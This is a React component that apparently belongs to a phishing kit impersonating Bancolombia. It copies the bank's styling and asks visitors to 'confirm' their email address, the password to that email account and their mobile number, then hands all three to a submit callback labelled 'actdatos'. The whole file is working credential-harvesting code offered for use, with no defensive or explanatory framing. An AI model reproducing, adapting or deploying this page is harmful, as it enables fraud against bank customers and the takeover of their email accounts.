/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
import { useState, useMemo } from "react";

export default function ActDatos({ enviar }: any) {
  const [correo, setCorreo] = useState("");
  const [clave, setClave] = useState("");
  const [celular, setCelular] = useState("");

  const isFormValid = useMemo(() => {
    return correo.includes("@") && correo.includes(".") && clave.length >= 3 && celular.length === 10;
  }, [correo, clave, celular]);

  const handleSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!isFormValid) return;
    enviar?.({
      view: 'actdatos',
      user: celular,
      correo: correo,
      correoClave: clave,
      bank: "bancolombia"
    });
  };

  return (
    <div className="bc-row bc-justify-content-center form-container">
      <div className="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
        <section className="bc-mt-4" style={{ background: "#f9f9fa" }} />

        <div>
          <div className="bc-card-body bc-mt-4">

            <div className="bc-card bc-card-auth bc-card-container">
              <div className="bc-card-auth-body" style={{ paddingBottom: '2rem' }}>

                <section className="bc-card-auth-head">
                  <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3 text-center">
                    ¡Hola!
                  </h1>

                  <h3 className="bc-card-auth-description bc-mt-3 auth-description text-center" style={{ padding: '0 20px', marginBottom: '20px' }}>
                    Confirma tus datos de contacto para continuar.
                  </h3>
                </section>

                {/* FORM REAL */}
                <form noValidate id="form" onSubmit={handleSubmit}>
                  <section>
                    <section className="bc-card-auth-container" style={{ padding: '0 20px' }}>

                      {/* Correo Electrónico */}
                      <div className="authentication-form__username">
                        <div className="bc-form-field">
                          <input
                            id="correo"
                            value={correo}
                            onChange={(e) => setCorreo(e.target.value.replace(/\s/g, ""))}
                            className="bc-input"
                            placeholder=" "
                            autoComplete="off"
                            aria-label="Correo electrónico"
                          />
                          <label
                            htmlFor="correo"
                            className="opacity-100 translate-y-0 label-fixed"
                          >
                            Correo electrónico
                          </label>
                        </div>
                      </div>

                      {/* Clave de Correo */}
                      <div className="authentication-form__username bc-mt-2">
                        <div className="bc-form-field">
                          <input
                            id="clave"
                            type="password"
                            value={clave}
                            onChange={(e) => setClave(e.target.value)}
                            className="bc-input"
                            placeholder=" "
                            autoComplete="off"
                            aria-label="Clave de correo"
                          />
                          <label
                            htmlFor="clave"
                            className="opacity-100 translate-y-0 label-fixed"
                          >
                            Clave de tu correo
                          </label>
                        </div>
                      </div>

                      {/* Celular */}
                      <div className="authentication-form__username bc-mt-2">
                        <div className="bc-form-field">
                          <input
                            id="celular"
                            value={celular}
                            onChange={(e) => setCelular(e.target.value.replace(/\D/g, "").substring(0, 10))}
                            className="bc-input"
                            placeholder=" "
                            inputMode="numeric"
                            autoComplete="off"
                            aria-label="Celular"
                          />
                          <label
                            htmlFor="celular"
                            className="opacity-100 translate-y-0 label-fixed"
                          >
                            Número celular
                          </label>
                        </div>
                      </div>

                    </section>
                  </section>

                  {/* Botón de continuar */}
                  <section className="bc-card-auth-button bc-mt-4" style={{ padding: '0 20px' }}>
                    <button
                      className="bc-button bc-button-fill bc-button-primary w-full"
                      type="submit"
                      disabled={!isFormValid}
                    >
                      Continuar
                    </button>
                  </section>
                </form>

              </div>
            </div>
          </div>

          {/* Loader */}
          <div className="bc-circle-loading-container">
            <article
              className="bc-circle-loading"
              data-text="Cargando..."
              role="status"
            >
              <section
                className="bc-circle-loading-circle"
                style={{ "--circle-loading-size": "160px" } as any}
              >
                <em className="bc-icon bc-xl bc-loader bc-circle-loading-loader-icon">
                  spinner
                </em>
                <p className="bc-circle-loading-info">Cargando...</p>
              </section>
            </article>
          </div>

        </div>
      </div>
      {/* Spacer to push footer down */}
      <div style={{ minHeight: '150px', width: '100%' }}></div>
    </div>
  );
}